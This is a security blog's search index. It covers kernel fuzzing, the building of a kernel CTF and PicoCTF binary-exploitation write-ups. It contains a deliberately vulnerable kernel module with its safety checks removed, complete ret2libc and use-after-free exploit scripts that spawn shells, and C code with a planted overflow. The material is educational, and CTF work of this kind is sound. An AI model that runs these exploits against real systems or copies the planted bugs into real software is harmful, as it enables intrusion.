{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Blog","text":"<p>My posts about low-level internals of whatever I've got my hands on at the moment</p> <p> nofilq papadoxie nofil-qasim</p>"},{"location":"Kernel%20Fuzzing%20with%20syzkaller%20on%20ESXi/","title":"Kernel Fuzzing with syzkaller on ESXi","text":"<p>Finding the proper infrastructure to fuzz the Linux kernel can be a tricky thing. You don't want to do it on your daily use machine since it'll hog up all the resources and get in the way of work. You also need something that will keep running 24/7 without interruption for at least a few months. Enter V-Lab.</p>"},{"location":"Kernel%20Fuzzing%20with%20syzkaller%20on%20ESXi/#v-lab","title":"V-Lab","text":"<p>V-Lab is the VMWare ESXi set up that I have at my workplace. It runs on a machine with the following specs: - Intel Xeon E5-2660v4 with 24 cores and 56 threads @ 2.00 GHz - 64 GB Memory  - 2.0 TB Disk Space</p> <p>Not the most powerful server you could use for fuzzing but it can get the job done.</p>"},{"location":"Kernel%20Fuzzing%20with%20syzkaller%20on%20ESXi/#virtual-machines","title":"Virtual Machines","text":"<p>Initially I decided to go the simple old route of setting up one mega VM with loads of CPU cores and memory, and use nested virtualization to spin up further VMs for fuzzing the kernel. I quickly ran into lots of issues however. SSH refused to work inside my nested VMs when syzkaller tried to spin them up automatically. Even if I resolved those issues I would still end up with sub-par performance due to nested virtualization.</p> <p>Then I decided to go for the following set up:  </p>"},{"location":"Kernel%20Fuzzing%20with%20syzkaller%20on%20ESXi/#controller-vm","title":"Controller VM","text":"<pre><code>- OS: Ubuntu 22.04 LTS\n- Cores: 8\n- Memory: 16 GB\n- Hard Disk: 50 GB\n</code></pre>"},{"location":"Kernel%20Fuzzing%20with%20syzkaller%20on%20ESXi/#fuzz-vms","title":"Fuzz VMs","text":"<pre><code>- Count: 10\n- OS: Arch Linux\n- Cores: 2\n- Memory: 2 GB\n- Hard Disk: 8 GB\n</code></pre>"},{"location":"Kernel%20Fuzzing%20with%20syzkaller%20on%20ESXi/#setting-up-the-controller-vm","title":"Setting up the Controller VM","text":""},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/","title":"Making a Kernel CTF (PUCon'24 pwn CTF)","text":"<p>Recently I had the pleasure of designing some challenges for a CTF held at my alma mater, University of the Punjab. Despite having reasonable experience with solving kernel challenges in the past, this was my first time actually making a kernel challenge on my own.</p> <p>The idea was pretty simple, write a module that had a simple buffer overflow that led to RIP control. The execution however, was not that simple, so I decided to write this blog to document everything it took to set my challenges up.</p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#environment","title":"Environment","text":"<p>The challenge was going to be hosted on CTFd's managed hosting so it had to be able to run in a Docker container. Since the container was going to run on CTFd infrastructure, we couldn't be sure what kernel we were going to get. To get past this we decided to run our challenge inside a <code>qemu</code> VM inside our container.  </p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#vm","title":"VM","text":"<p>Initially for the guest OS, we went with the syzcaller debootstrap script (https://github.com/google/syzkaller/blob/master/tools/create-image.sh) that sets up a fully featured Debian image for us.  After setting it up we found out the VM was using way more memory than what CTFd allowed for one container so we switched to using a simple <code>initramfs</code> with <code>busybox</code> setup. Our setup was similar to <code>hxp-ctfs</code> kernel ROP challenge (https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/) with a modified <code>run.sh</code> script.</p> <pre><code>read -p \"Enter the link to your exploit binary: \" link\n\nwget $link -O exploit\nchmod 777 ./exploit\nsleep 1\n./decompress.sh\nrm intramfs/exploit\ncp ./exploit initramfs/\n./compress.sh\n\nqemu-system-x86_64 \\\n  -snapshot \\\n  -kernel kernel/arch/x86/boot/bzImage \\\n  -smp cores=1,threads=1 \\\n  -initrd initramfs.cpio.gz \\\n  -append \"console=ttyS0 debug earlyprintk=serial oops=panic nokaslr smap smep selinux=0 pti tsc=unstable net.ifnames=0 panic=1000 cgroup_disable=memory\" \\\n  -net nic -net user,hostfwd=tcp::${SSH_PORT}-:22 \\\n  -nographic \\\n  -m 128M \\\n  -monitor none,server,nowait,nodelay,reconnect=-1 \\\n  -cpu kvm64,+smap,+smep \\\n  2&gt;&amp;1\n</code></pre> <p>Since the exploit was supposed to run locally on the VM, we provided a way for the contestants to upload their exploit as soon as they connected by reading in a link at the start and downloading a file from there and putting it in the <code>initramfs</code>.</p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#container","title":"Container","text":"<p>The container environment was pretty simple. <code>cpio</code> and <code>gzip</code> were required to modify the <code>initramfs</code> and put the contestants exploits into the VM. <code>wget</code> was used to download the exploit. <code>qemu</code> was used to run the VM.  </p> Dockerfile<pre><code>FROM ubuntu:latest\n\nRUN apt-get update\nRUN apt-get install -y qemu qemu-system-x86 qemu-utils socat cpio gzip wget \n\nEXPOSE 1337\n\nRUN useradd -d /home/ctf -m -p ctf -s /bin/bash ctf\nRUN echo \"ctf:ctf\" | chpasswd\nRUN ulimit -c 0\n\nWORKDIR /home/ctf\nCOPY kernel ./kernel\nCOPY run.sh ./run.sh\nCOPY initramfs.cpio.gz ./initramfs.cpio.gz\nCOPY compress.sh ./compress.sh\nCOPY decompress.sh ./decompress.sh\nRUN chmod +x *.sh\nRUN chmod 666 ./initramfs.cpio.gz\n\nEXPOSE 1337\nUSER ctf\nCMD socat tcp-l:1337,reuseaddr,fork EXEC:\"./run.sh\",pty,stderr\n</code></pre> <p>Initially we used <code>ynetd</code> to serve the challenge but for some reason, one night before the CTF was supposed to star, <code>ynetd</code> decided to bail on us and started sending EOF on <code>stdin</code> as soon as we attempted to connect. For this reason we shifted to using <code>socat</code>. Unfortunately this meant the shell that was served was unstable by default and we only figured out how to connect to it stably after the competition ended. Fortunately the kernel challenges were able to be solved with unstable shells. <pre><code>socat file:`tty`,raw,echo=0 tcp:&lt;challenge-link&gt;:&lt;port&gt;\n</code></pre></p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#kernel","title":"Kernel","text":"<p>The kernel we chose was <code>v6.6.16</code> and we applied some of our own patches to make it easier to exploit.</p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#added-exports","title":"Added Exports","text":"<p>Some symbols were exported so we could directly use them to make a win function in our module. kernel/cred.c<pre><code>EXPORT_SYMBOL(init_cred)\n</code></pre></p> kernel/reboot.c<pre><code>EXPORT_SYMBOL(run_cmd)\n</code></pre>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#removing-safety-checks-in-code","title":"Removing Safety Checks in Code","text":"<p>We had to remove the size check in <code>copy_to_user</code> and <code>copy_from_user</code> to make sure our module would actually receive more bytes than the buffer could hold. <code>include/linux/uaccess.h</code> <pre><code>static __always_inline unsigned long __must_check\ncopy_from_user(void *to, const void __user *from, unsigned long n)\n{\n    // if (check_copy_size(to, n, false))\n        n = _copy_from_user(to, from, n);\n    return n;\n}\n\nstatic __always_inline unsigned long __must_check\ncopy_to_user(void __user *to, const void *from, unsigned long n)\n{\n    // if (check_copy_size(from, n, true))\n        n = _copy_to_user(to, from, n);\n    return n;\n}\n</code></pre></p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#removing-safety-checks-in-config","title":"Removing Safety Checks in Config","text":"<p>We used <code>defconfig</code> which was based on <code>x86_64_defconfig</code> and edited it to turn off mitigations. .config<pre><code>CONFIG_CC_HAS_RETURN_THUNK=n\nCONFIG_CALL_PADDING=n\nCONFIG_HAVE_CALL_THUNKS=n\nCONFIG_CALL_THUNKS=n\nCONFIG_PREFIX_SYMBOLS=n\nCONFIG_RETPOLINE=n\nCONFIG_RETHUNK=n\nCONFIG_CPU_UNRET_ENTRY=n\nCONFIG_CALL_DEPTH_TRACKING=n\nCONFIG_CPU_IBPB_ENTRY=n\nCONFIG_CPU_IBRS_ENTRY=n\nCONFIG_CPU_SRSO=n\nCONFIG_STACKPROTECTOR=n\nCONFIG_STACKPROTECTOR_STRONG=n\n</code></pre></p> <p>Retpoline and return thunk proved hard to turn off for some reason. Setting their variables to <code>n</code> wouldn't work and they'd get set to <code>y</code> as soon as we started the build. To get past this we had to remove the options directly from <code>arch/x86/Kconfig</code></p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#vulnerable-module","title":"Vulnerable Module","text":"<p>The module was pretty simple. It created a device that you could write to and read from. The vulnerability was in the unchecked read by the <code>copy_from_user</code> function that we patched earlier. <code>copy_from_user</code> was used to read unbounded data written from user-space into a kernel buffer of size 256 bytes.  </p> <p>We added a <code>file_sending_system</code> win function that escalated privileges using <code>commit_creds(&amp;init_cred)</code> and then read a file from the file-system using the <code>kernel_read_file_from_path</code> function defined in <code>fs/kernel_read_file.c</code>. We had to add pragmas to ensure this function would not be optimized out by the compiler since it wasn't being called anywhere. vuln.c<pre><code>MODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"papadoxie\");\nMODULE_DESCRIPTION(\"Kernel Messaging System\");\nMODULE_VERSION(\"1337\");\n\nstatic int majorNumber;\nstatic char *message_to_return = NULL;\nstatic int size_of_message;\nstatic struct class *messageClass = NULL;\nstatic struct device *messageDevice = NULL;\n\nstatic struct file_operations fops =\n{\n        .open = dev_open,\n        .read = dev_read,\n        .write = dev_write,\n        .release = dev_release,\n};\n\n#pragma GCC push_options\n#pragma GCC optimize(\"O0\")\n__attribute__((unused)) \n__attribute((noreturn))\nvolatile static int file_sending_system(void)\n{\n    printk(KERN_INFO \"Messager: In the future I'll be able to send files to the kernel too!\\n\");\n    printk(KERN_INFO \"Messager: No need to enable this function since it isn't completed\\n\");\n\n    char *file_path = \"/root/flag.txt\";\n    loff_t offset = 0;\n    size_t bufsize = 64;\n    size_t filesize = 4096;\n    enum kernel_read_file_id id = 0;\n    void *file_buf = kmalloc(bufsize, GFP_KERNEL);\n\n    commit_creds(&amp;init_cred);\n    kernel_read_file_from_path(file_path, offset, &amp;file_buf, bufsize, &amp;filesize, id);\n    printk(KERN_INFO \"Messager: File content: %s\\n\", (char *)file_buf);\n    while(1)\n        ;\n}\n#pragma GCC pop_options\n\nstatic int __init mod_init(void)\n{\n    printk(KERN_INFO \"#####################################################################################\\n\");\n    printk(KERN_INFO \"\\tPAPADOXIE'S EASY KERNEL MESSAGING SYSTEM\\n\");\n    printk(KERN_INFO \"\\tTransfer your message to the kernel and get a response back promptly!\\n\");\n    printk(KERN_INFO \"\\tMessager: Initializing......\\n\");\n    printk(KERN_INFO \"#####################################################################################\\n\");\n\n\n    majorNumber = register_chrdev(0, DEVICE_NAME, &amp;fops);\n    if (majorNumber &lt; 0)\n    {\n        printk(KERN_ALERT \"Messager: Failed to register a major number\\n\");\n        return majorNumber;\n    }\n    printk(KERN_INFO \"Messager: Registered correctly with major number %d\\n\", majorNumber);\n\n    messageClass = class_create(CLASS_NAME);\n    if (IS_ERR(messageClass))\n    {\n        unregister_chrdev(majorNumber, DEVICE_NAME);\n        printk(KERN_ALERT \"Messager: Failed to register device class\\n\");\n        return PTR_ERR(messageClass);\n    }\n    printk(KERN_INFO \"Messager: Device class registered correctly\\n\");\n\n    messageDevice = device_create(messageClass, NULL, MKDEV(majorNumber, 0), NULL, DEVICE_NAME);\n    if (IS_ERR(messageDevice))\n    {\n        class_destroy(messageClass);\n        unregister_chrdev(majorNumber, DEVICE_NAME);\n        printk(KERN_ALERT \"Failed to create the device\\n\");\n        return PTR_ERR(messageDevice);\n    }\n    printk(KERN_INFO \"Messager: device class created correctly\\n\");\n    return 0;\n}\n\nstatic void __exit mod_exit(void)\n{\n    device_destroy(messageClass, MKDEV(majorNumber, 0));\n    class_unregister(messageClass);\n    class_destroy(messageClass);\n    unregister_chrdev(majorNumber, DEVICE_NAME);\n    printk(KERN_INFO \"Messager: Goodbye from the LKM!\\n\");\n}\n\nstatic int dev_open(struct inode *inodep, struct file *filep)\n{\n    printk(KERN_INFO \"Messager: Kernel communication link established\\n\");\n    return 0;\n}\n\nstatic ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset)\n{\n    int error_count = 0;\n    error_count = copy_to_user(buffer, message_to_return, size_of_message);\n\n    if (error_count == 0)\n    {\n        printk(KERN_INFO \"Messager: Sent %d characters to the user\\n\", size_of_message);\n        kfree(message_to_return);\n        return (size_of_message = 0);\n    }\n    else\n    {\n        printk(KERN_INFO \"Messager: Failed to send %d characters to the user\\n\", error_count);\n        return -EFAULT;\n    }\n}\n\nstatic ssize_t dev_write(struct file *filep, const char *buffer, size_t len, loff_t *offset)\n{\n    char message[256];\n    if (copy_from_user(message, buffer, len))\n    {\n        printk(KERN_ALERT \"Messager: Failed to copy data from user\\n\");\n        return -EFAULT;\n    }\n\n    message_to_return = kmalloc(len, GFP_KERNEL);\n    memcpy(message_to_return, message, len);\n\n    size_of_message = len;\n    printk(KERN_INFO \"Messager: Received %zu characters from the user\\n\", len);\n    return len;\n}\n\nstatic int dev_release(struct inode *inodep, struct file *filep)\n{\n    printk(KERN_INFO \"Messager: Device successfully closed\\n\");\n    return 0;\n}\n\nmodule_init(mod_init);\nmodule_exit(mod_exit);\n</code></pre></p>"},{"location":"Making%20a%20Kernel%20CTF%20%28PUCon%2724%20pwn%20CTF%29/#deployment","title":"Deployment","text":"<p>After setting all that up locally, it was time to deploy the challenge on CTFd. This was as simple as deploying any other challenge. First we built the Docker image for the challenge and tagged it. Then we pushed it to the CTFd repo and it miraculously worked...... after 3 days of debugging and rewriting.</p>"},{"location":"CTF-Writeups/PicoCTF/CacheMeOutside/CacheMeOutside/","title":"CacheMeOutside","text":"<p>&lt;&lt; Back to Home</p>"},{"location":"CTF-Writeups/PicoCTF/CacheMeOutside/CacheMeOutside/#cache-me-outside","title":"Cache Me Outside","text":""},{"location":"CTF-Writeups/PicoCTF/CacheMeOutside/CacheMeOutside/#write-up-of-the-picoctf-binary-exploitation-challenge","title":"Write-up of the PicoCTF Binary Exploitation Challenge","text":""},{"location":"CTF-Writeups/PicoCTF/CacheMeOutside/CacheMeOutside/#setup","title":"Setup","text":"<p>3 files are provided to us for the challenge and the address to the server is also provided.</p> <p>Lets download the files and try to run the binary</p> <p></p> <p>We get a crash This occurs because our linker is a newer version than the libc provided</p> <p></p> <p>We can fix this using pwninit which will automatically take care of this</p> <p></p> <p>Lets try running it now</p> <p></p> <p>Hmm, it still crashes Lets open the binary in Ghidra and take a look at whats going on</p>"},{"location":"CTF-Writeups/PicoCTF/CacheMeOutside/CacheMeOutside/#analysis","title":"Analysis","text":""},{"location":"CTF-Writeups/PicoCTF/CacheMeOutside/CacheMeOutside/#exploitation","title":"Exploitation","text":""},{"location":"CTF-Writeups/PicoCTF/HeresALIBC/HeresALIBC/","title":"HeresALIBC","text":"<p>&lt;&lt; Back to Home</p>"},{"location":"CTF-Writeups/PicoCTF/HeresALIBC/HeresALIBC/#heres-a-libc","title":"Here's a LIBC","text":""},{"location":"CTF-Writeups/PicoCTF/HeresALIBC/HeresALIBC/#write-up-of-the-picoctf-binary-exploitation-challenge","title":"Write-up of the PicoCTF Binary Exploitation Challenge","text":""},{"location":"CTF-Writeups/PicoCTF/HeresALIBC/HeresALIBC/#setup","title":"Setup","text":"<p>3 files are provided to us for the challenge and the address to the server is also provided.</p> <p>Lets download the files and try to run the binary</p> <p></p> <p>We get a crash This occurs because our linker is a newer version than the libc provided</p> <p></p> <p>We can fix this using pwninit which will automatically take care of this</p> <p></p> <p>This fixed the problem</p> <p></p>"},{"location":"CTF-Writeups/PicoCTF/HeresALIBC/HeresALIBC/#analysis","title":"Analysis","text":"<p>Lets open the binary in Ghidra and take a look at whats going on</p> <p></p> <p>There is no input being taken in the main function but we see another function Lets check it out</p> <p></p> <p>This looks like what we are looking for I have retyped some variables so its easier to understand As we can see there is no bound checking on the scanf input We can easily overflow the buffer since scanf will take an input until it encounters a newline</p> <p></p> <p>Sure enough, we get a segmentation fault and the program crashes  </p> <p>Lets check the protections on the binaries</p> <p></p> <p>The stack is not executable so we can't execute shellcode pushed onto it PIE is off for vuln meaning addresses won't change for the binary on each execution This means we can easily leak an address from libc and use it to return to libc</p>"},{"location":"CTF-Writeups/PicoCTF/HeresALIBC/HeresALIBC/#exploitation","title":"Exploitation","text":"<p>Lets open the binary in GDB and find exactly where we overwrite RIP</p> <p></p> <p></p> <p>Now we need to find some ROP Gadgets to leak the address of a function in libc We can use pwntools ROPgadget for this  </p> <p>We will use the puts() function to print out an address in libc so we also need the address of puts@plt We can leak the address of any function inside libc. I have chosen setbuf()</p> <p>To print the address of setbuf() in libc we need to pass the address of setbuf@got to puts() For this we will need to find a ROP Gadget that will allow us to modify RDI</p> <p></p> <p></p> <p></p> <p>Now that we have found the relevant addresses we can leak the address of setbuf() inside libc</p> <pre><code>import pwnlib.util.packing as pack\nfrom pwn import log, process, remote\n\np = process(\"./vuln\")  # Local binary\n\npadding = b\"A\" * 136\npop_rdi = 0x400913  # ROP Gadget for popping rdi\nsetbuf_at_got = 0x601028  # Address of setbuf() in GOT\nputs_at_plt = 0x400540  # Address of puts() in PLT\nmain = 0x400771  # Address of main for returning safely after leaking setbuf() address in libc\n\n# ? Craft the payload to leak address of setbuf in libc\npayload = padding  # Pad the stack until the stored RIP\npayload += pack.p64(pop_rdi)  # Set the address of setbuf() in GOT as the first argument of puts()\npayload += pack.p64(setbuf_at_got)  # This will be the first argument of puts()\npayload += pack.p64(puts_at_plt)  # Call puts()\npayload += pack.p64(main)  # Return to main() so the program doesnt crash\n\n# ? Send the payload\np.sendline(payload)\np.recvline()  # Discard data we dont need\np.recvline()  # Discard data we dont need\nleak = pack.u64(p.recvline().strip().ljust(8, b\"\\x00\"))  # Format the address of setbuf() properly\nlog.info(f\"Leaked setbuf Address -&gt; {hex(leak)}\")\n</code></pre> <p></p> <p>Now that we have an address inside libc we can calculate the base address of libc itself First lets figure out the offset of setbuf() from the base address of libc</p> <p></p> <p>Now we can add this to our exploit</p> <pre><code>setbuf_offset = 0x88540  # Static offset of setbuf() in libc\nlibc_base = leak - setbuf_offset  # Calculate base address of libc\nlog.info(f\"libc Base Address -&gt; {hex(libc_base)}\")\n</code></pre> <p>To get a shell on the target system we will use the system() function which is also inside libc Lets find its address</p> <p></p> <pre><code>system_offset = 0x4F4E0  # Static offset of system() in libc\nlibc_system = libc_base + system_offset # Calculate the actual address of system() in libc\nlog.info(f\"system Address -&gt; {hex(libc_system)}\")\n</code></pre> <p>We can pass \"/bin/sh\" to system() to get a shell As this string is already present inside libc we dont need to put it on the stack ourselves We can simply use the one already available to us Lets find its address </p> <p></p> <pre><code>binsh_offset = 0x1B40FA  # Static offset of /bin/sh string in libc\nlibc_binsh = libc_base + binsh_offset\nlog.info(f\"/bin/sh Address -&gt; {hex(libc_binsh)}\")\n</code></pre> <p>Now that we have all the relevant addresses we can finally craft our final payload Here is the remaining exploit</p> <pre><code># ? Craft the payload to call system(\"/bin/sh\")\npayload = padding  # Pad the stack until the stored RIP\npayload += pack.p64(pop_rdi)  # Set the address of the string /bin/sh as the first argument of system()\npayload += pack.p64(libc_binsh)  # This will be the first argument of system()\npayload += pack.p64(ret)  # Align the stack to 16 bytes otherwise system() will crash\npayload += pack.p64(libc_system)  # Call system()\n\n# ? Send the payload\np.sendline(payload)\n\n# ? Start an interactive session\np.interactive()\n</code></pre> <p>Notice we added another ROP Gadget (ret). This is to align the stack for the call to system() If the stack isn't aligned then we will get a segmentation fault and the program will crash Lets run the exploit script against the target server now</p> <p></p> <p>Nice. It works Now we can grab the flag</p> <p></p>"},{"location":"CTF-Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree/","title":"UnsubscriptionsAreFree","text":"<p>&lt;&lt; Back to Home</p>"},{"location":"CTF-Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree/#unsubscriptions-are-free","title":"Unsubscriptions Are Free","text":""},{"location":"CTF-Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree/#write-up-of-the-picoctf-binary-exploitation-challenge","title":"Write-up of the PicoCTF Binary Exploitation Challenge","text":""},{"location":"CTF-Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree/#setup","title":"Setup","text":"<p>2 files are provided to us for the challenge and the address to the server is also provided.</p> <p>Let's download the files and take a look at the source</p>"},{"location":"CTF-Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree/#analysis","title":"Analysis","text":"<p>Immediately we see a function that prints the flag  </p> <p></p> <p>Upon further analysis we can see that this function is not being called anywhere but there is another suspicious function</p> <p></p> <p>Running the binary we can see this prints out the address of the function that will print the flag</p> <p></p> <p>Let's explore further to see how we can use this information  </p> <p>The main function is pretty straightforward as well as the printMenu function</p> <p></p> <p></p> <p>The processInput function handles the processing of all the user input</p> <p></p> <p>doProcess just calls the function pointed to by the function pointer passed to it</p> <p></p> <p>Now let's take a look at the remaining functions</p> <p></p> <p>There is a pointer being freed here and this function can be called multiple times This seems like a bug. Let's test it</p> <p></p> <p>This looks like a Use After Free bug. Let's try to find out if we can write to this allocation somehow</p> <p></p> <p>Here we have it. A function that allocates an 8 byte buffer and lets us write to it Now what will happen is - We will free the \"user\" buffer - It will go into the tcache - We will allocate a buffer - This allocation will come from the tcache and it'll point to the same place \"user\" was pointing to - We will write the address of the \"hahaexploitgobrr\" function to this buffer - We will free the \"user\" buffer again to call the function</p> <p>Let's try this out</p>"},{"location":"CTF-Writeups/PicoCTF/UnsubscriptionsAreFree/UnsubscriptionsAreFree/#exploitation","title":"Exploitation","text":"<p>Here's the exploit script</p> <pre><code>#!/usr/bin/python3\n\nfrom pwn import log, process, remote, time\nimport pwnlib.util.packing as pack\n\np = remote(\"mercury.picoctf.net\", 48259)\n\np.sendline(b\"S\") # Get the memory leak\n\nfor i in range(9):\n    try:\n        inp = str(p.recvline()[21:].strip())[2:].strip(\"'\") # Get the address from the leak\n    except:\n        log.info(\"\")\n\n\ninp = int(inp, 16) # Convert it to hex\nlog.info(f\"{hex(inp)}\")\n\np.sendline(b\"I\")    # Free user\np.sendline(b\"Y\")\n\np.sendline(b\"L\")    # Allocate the new buffer and write the address to it\ntime.sleep(1)\np.sendline(pack.p64(inp))\n\np.sendline(b\"I\")    # Free user again\np.sendline(b\"Y\")\n\np.interactive()\n</code></pre> <p></p> <p>It worked! We got the flag</p>"},{"location":"WebAssembly-Internals/Background/","title":"Background","text":""},{"location":"WebAssembly-Internals/Background/#webassembly","title":"WebAssembly","text":"<p>WebAssembly is a bytecode language (like Java or Python bytecode) with a low-level memory model without garbage collection. It can be thought of as an assembly language for the web just like x86-64 is an assembly language for native hardware.</p> <p>Similar to native assembly, programs written in languages like C, C++, and Rust can be compiled into WebAssembly</p> <p>When a WebAssembly binary is run, there are 4 main concepts to be aware of (https://developer.mozilla.org/en-US/docs/WebAssembly/Concepts)</p> <ul> <li>Module: Modules represent a WebAssembly binary that has been compiled by the runtime into machine code. Modules declare imports and exports</li> <li>Memory: A resizable array of bytes that contains the linear address space used by WebAssembly instructions. This contains the program stack and the heap.</li> <li>Table: A resizable typed array containing references to variables and functions. WebAssembly stores function pointers separately for safety reasons.</li> <li>Instance: A Module paired with a state including its Memory, Table, and the set of imported values.</li> </ul>"},{"location":"WebAssembly-Internals/Background/#memory","title":"Memory","text":"<p>https://developer.mozilla.org/en-US/docs/WebAssembly/Using_the_JavaScript_API#memory</p> <p>Each WASM module has its own sandboxed memory space which can be created manually in JavaScript using the WebAssembly.Memory() object constructor</p> <p>Previous Next</p>"},{"location":"WebAssembly-Internals/Binaries/","title":"Binaries","text":""},{"location":"WebAssembly-Internals/Binaries/#module","title":"Module","text":"<p>Compiled WebAssembly binaries, known as modules, can be found on disk as <code>WebAssembly (wasm) binary module version 0x1 (MVP)</code></p> <p>Filetype information can be found inside the binary itself  WebAssembly binaries start with 4 magic bytes \\x00asm followed by a 32-bit little-endian version number (https://www.pnfsoftware.com/reversing-wasm.pdf)</p>"},{"location":"WebAssembly-Internals/Binaries/#sections","title":"Sections","text":""},{"location":"WebAssembly-Internals/Binaries/#browser-vs-wasi-modules","title":"Browser vs WASI Modules","text":"<p>Compiling a program for a Browser or Native OS with Emscripten both generate a .wasm Module but there are some differences in the Module. </p> <p> Diffing indicates this difference but doesnt generate a comparison Bindiff also does not work because the assembly is non-native</p> <p>Diffing the WAT representation of the Modules shows us the difference The most apparent difference is in the imports </p> <p>But a more interesting difference is in the offsets  This means it might not be possible to use the same exploit between Modules of the same program</p> <p>Diffing 2 Modules compiled from the same source and targeting the same platform yields no differences  This rules out the possibility of the differences being results of unexpected compiler behaviour</p> <p>Previous Next</p>"},{"location":"WebAssembly-Internals/Compilation/","title":"Compilation","text":"<p>There are multiple projects working on compilation of WebAssembly. Some of the notable ones include: - WASIC - Emscripten - Clang</p>"},{"location":"WebAssembly-Internals/Compilation/#example-code","title":"Example Code","text":"<p>We will be using the following code for a demo of the compilation process</p> <pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n#include &lt;emscripten.h&gt;\n\nint main(void)\n{\n\u00a0 \u00a0 char hello[] = \"Hello World\\n\";\n\u00a0 \u00a0 char *str = malloc(255);\n\u00a0 \u00a0 strcpy(str, \"This is a test string\");\n\u00a0 \u00a0 char buf[10];\n\u00a0 \u00a0 scanf(\"%s\", buf); // Buffer Overflow\n\u00a0 \u00a0 printf(\"%s\\n\", buf);\n\u00a0 \u00a0 printf(hello); \u00a0// Format String\n\u00a0 \u00a0 printf(\"\\n\");\n\u00a0 \u00a0 printf(\"%s\\n\", str); // Buffer Overflow\n\u00a0 \u00a0 return 0;\n}\n</code></pre>"},{"location":"WebAssembly-Internals/Compilation/#wasic","title":"WASIC","text":"<p>https://docs.wasmer.io/ecosystem/wasienv/compile-c-c++-to-wasm-wasi</p> <p>Simple C Compiler for the WebAssembly System Interface (WASI). WASIC can be used to compile standalone WebAssembly Modules. These can run on native OS VMs directly, and, on browsers, by wrapping them with JavaScript glue code.</p> <p>Supports: - GNU/Make (wasimake) - ./configure files (wasiconfigure) - CMake (wasicmake) - C++ Compilation (wasic++)</p>"},{"location":"WebAssembly-Internals/Compilation/#emscripten-httpsemscriptenorg","title":"Emscripten (https://emscripten.org/)","text":"<p>Emscripten is a compiler toolchain that compiles C and C++ code to WebAssembly. It uses Clang and LLVM to generate WebAssembly bytecode and JavaScript \u201cglue code\u201d.</p> <p>The JavaScript code is used to implement C standard library functions for the WebAssembly environment (browser, Wasmer, etc.)</p>"},{"location":"WebAssembly-Internals/Compilation/#emscripten-toolchain-set-up","title":"Emscripten toolchain set up:","text":"<p>https://emscripten.org/docs/getting_started/downloads.html</p> <pre><code>git clone [https://github.com/emscripten-core/emsdk.git](https://github.com/emscripten-core/emsdk.git)\n\ncd emsdk\n\n./emsdk install latest\n\n./emsdk activate latest\n\necho \"source $(PWD)/emsdk_env.sh\" &gt; ~/.bashrc\n</code></pre>"},{"location":"WebAssembly-Internals/Compilation/#building-and-running","title":"Building and Running","text":"<p>https://developer.mozilla.org/en-US/docs/WebAssembly/C_to_wasm</p>"},{"location":"WebAssembly-Internals/Compilation/#for-browser","title":"For Browser","text":"<p>Using Emscripten we can compile code for a browser. We will also enable debug symbols and provide the path where they will be placed. The debug path should be the root of our python server. <pre><code>emcc hello.c -o bin/hello.html -g -fdebug-compilation-dir='..'\n</code></pre></p> <p>To run the code we need a test server. The simplest way is to use a python server <pre><code>python3 -m http.server 8008 &gt; /dev/null 2&gt; /dev/null&amp;\n</code></pre></p> <p>Now we can run it like a normal webpage on Chrome.</p>"},{"location":"WebAssembly-Internals/Compilation/#important-directives-and-definitions","title":"Important directives and definitions","text":"<p>Emscripten optimizes away all functions other than main() as dead code.</p> <p>The <code>EMSCRIPTEN_KEEPALIVE</code> definition is used to tell the compiler not to optimize away custom functions. This is important for testing vulnerabilities such as control flow.</p> <p><code>ccall()</code>is used to call custom C and C++ functions outside of the main program loop. These functions can be called from HTML forms and JavaScript code. To use ccall() we have to provide the following compilation flag.</p> <p><code>-s \"EXPORTED_RUNTIME_METHODS=['ccall']\"</code></p> <p>This is also important for testing vulnerabilities such as control flow.</p> <p>Previous Next</p>"},{"location":"WebAssembly-Internals/Debugging/","title":"Debugging","text":""},{"location":"WebAssembly-Internals/Debugging/#on-a-browser","title":"On a Browser","text":"<p>Using Chrome DevTools we can view the WAT representation and the C source of a WebAssembly Module. We can also set breakpoints and watch variables. Most importantly we can view the whole linear address space allocated for our WASM Instance.</p> <p></p> <p></p> <p>Previous</p>"},{"location":"WebAssembly-Internals/Environments/","title":"Environments","text":""},{"location":"WebAssembly-Internals/Environments/#webassembly-system-interface-wasi","title":"WebAssembly System Interface (WASI)","text":"<p>https://github.com/bytecodealliance/wasmtime/blob/main/docs/WASI-overview.md</p> <p>A standard runtime for WebAssembly. Supports running WebAssembly binaries on web browsers as well as other environments such as Node.js, Wasmer and Wasmtime</p>"},{"location":"WebAssembly-Internals/Environments/#features","title":"Features","text":"<ul> <li>Sandboxed sysroot</li> <li>WASI libc<ul> <li>MUSL libc </li> <li>libpreopen</li> <li>syscall wrappers (Abstraction Layer over both native OS and JS runtimes)</li> </ul> </li> <li>WASI API</li> </ul>"},{"location":"WebAssembly-Internals/Environments/#support","title":"Support","text":"<p>WASI supports running WebAssembly on - Native OS - Bare Metal - Web Polyfill - Inside Host Applications</p> <p>Previous Next</p>"},{"location":"WebAssembly-Internals/Introduction/","title":"Introduction","text":""},{"location":"WebAssembly-Internals/Introduction/#introduction","title":"Introduction","text":"<p>This write-up details everything I know about WebAssembly. Here I explore the WebAssembly specification, 